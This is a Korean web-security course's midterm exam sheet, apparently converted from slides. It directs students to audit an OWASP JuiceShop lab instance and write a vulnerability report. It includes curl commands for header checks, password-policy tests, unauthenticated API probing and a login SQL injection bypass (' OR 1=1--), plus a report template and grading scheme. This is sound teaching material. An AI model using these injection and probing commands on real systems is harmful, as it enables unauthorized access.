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08: 중간고사 — JuiceShop 점검 보고서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OWASP Testing Guide를 기반으로 체계적인 웹 취약점 점검을 수행한다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Week 02~07에서 학습한 기법을 종합하여 JuiceShop을 점검한다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전문적인 취약점 점검 보고서를 작성할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시험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시간: 120분 (점검 90분 + 보고서 작성 30분)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대상: http://10.20.30.80:3000 (OWASP JuiceShop)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제출물: 취약점 점검 보고서 (아래 양식에 따라 작성)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평가 기준: 취약점 발견 수, 보고서 품질, 재현 가능성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OWASP Testing Guide 개요 (15분)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1단계: 정보수집 (15분)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2단계: 인증/세션 점검 (20분)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3단계: 입력값 검증 점검 (40분)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4단계: 기타 취약점 (15분)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5단계: 보고서 작성 (30분)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1단계: 정보수집 (15분)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서버 정보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서버 헤더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-sI http://10.20.30.80:3000 | grep -iE "server|x-powered|x-frame|x-content|content-security|strict-transport"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쿠키 정보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-sI http://10.20.30.80:3000 | grep -i set-cookie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robots.txt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http://10.20.30.80:3000/robots.txt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보안 헤더 존재 여부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header in "X-Frame-Options" "X-Content-Type-Options" "Content-Security-Policy" "Strict-Transport-Security" "X-XSS-Protection"; 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2단계: 인증/세션 점검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비밀번호 정책 점검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짧은 비밀번호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result=$(curl -s -X POST http://10.20.30.80:3000/api/Users/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'{"email":"mid1@test.com","password":"1","passwordRepeat":"1","securityQuestion":{"id":1},"securityAnswer":"a"}')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"1자 PW: $(echo $result | python3 -c "import sys,json; d=json.load(sys.stdin); print('허용' if 'id' in d.get('data',{}) else '거부')" 2&gt;/dev/null)"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숫자만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result=$(curl -s -X POST http://10.20.30.80:3000/api/Users/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3단계: 입력값 검증 점검 (40분)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SQL Injection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로그인 SQLi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result=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login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"{\"email\":\"' OR 1=1--\",\"password\":\"x\"}")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"로그인 SQLi: $(echo $result | python3 -c "import sys,json; d=json.load(sys.stdin); print('취약' if 'token' in d.get('authentication',{}) else '안전')" 2&gt;/dev/null)"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검색 SQLi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result1=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=apple" | python3 -c "import sys,json; print(len(json.load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4단계: 기타 취약점 (15분)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정보 노출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에러 메시지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http://10.20.30.80:3000/api/Products/abc | python3 -m json.tool 2&gt;/dev/null | head -10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접근 제어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인증 없이 API 접근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api in "api/Products/1" "api/Feedbacks" "api/Challenges" "api/Users";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code=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000/$api")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"[$code] /$api (인증 없이)"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HTTPS 설정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-o /dev/null -w "%{http_code}" https://10.20.30.80:3000 2&gt;/dev/null || echo "HTTPS 미지원"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5단계: 보고서 작성 (30분)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6.1 보고서 양식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점검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점검 대상: http://10.20.30.80:3000 (OWASP JuiceShop)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점검 일시: 2026-03-27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점검자: (이름)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점검 도구: curl, nikto, sqlmap, Python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2.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총 점검 항목: __개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취약점 발견: 상(__)건 / 중(__)건 / 하(__)건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발견 취약점 목록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위치: POST /rest/user/login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유형: Classic SQL Injection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위험도: 상 (인증 우회)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curl -X POST http://10.20.30.80:3000/rest/user/login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-d '{"email":"' OR 1=1--","password":"x"}'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4. 보안 헤더 점검 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X-Frame-Options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X-Content-Type-Options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Content-Security-Policy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5. 종합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  <a:latin typeface="맑은 고딕"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>(전체적인 보안 수준 평가, 우선 조치 사항)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부록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  <a:latin typeface="맑은 고딕"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>(nikto 스캔 결과, sqlmap 결과 등 첨부)</a:t>
            </a:r>
            <a:br/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평가 기준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 챌린지 해결 (+5점/개, 최대 +15점)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ModSecurity(포트 80) WAF 우회 성공 (+10점)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수업에서 다루지 않은 취약점 발견 (+5점/개)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정보수집 | 15점 | 기술 스택 식별, 디렉터리 발견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인증/세션 | 15점 | 비밀번호 정책, JWT 분석, 세션 관리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SQL Injection | 20점 | 발견, 재현, 영향 분석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XSS | 15점 | Reflected/Stored/DOM 구분, 재현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기타 취약점 | 10점 | 파일 업로드, 경로 순회, 명령어 주입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JuiceShop 챌린지 가이드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챌린지 목록 조회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http://10.20.30.80:3000/api/Challenges/ | python3 -c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sys,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data = json.load(sys.stdin).get('data', [])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c in sorted(data, key=lambda x: x.get('difficulty', 0)):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solved = '해결' if c.get('solved') else '미해결'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print(f'[{solved}] 난이도{c.get(\"difficulty\",\"?\")} - {c.get(\"name\",\"\")}')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" 2&gt;/dev/null | head -20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9. 주의 사항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점검 대상 확인: 반드시 `10.20.30.80:3000` (JuiceShop)만 점검할 것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기록 유지: 모든 명령어와 결과를 기록할 것 (보고서 근거)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파괴적 행위 금지: 서비스 중단, 데이터 삭제 등은 감점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협업 금지: 개인별 독립적으로 수행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인터넷 참고 허용: 도구 사용법, 페이로드 참고 가능 (보고서 복사 불가)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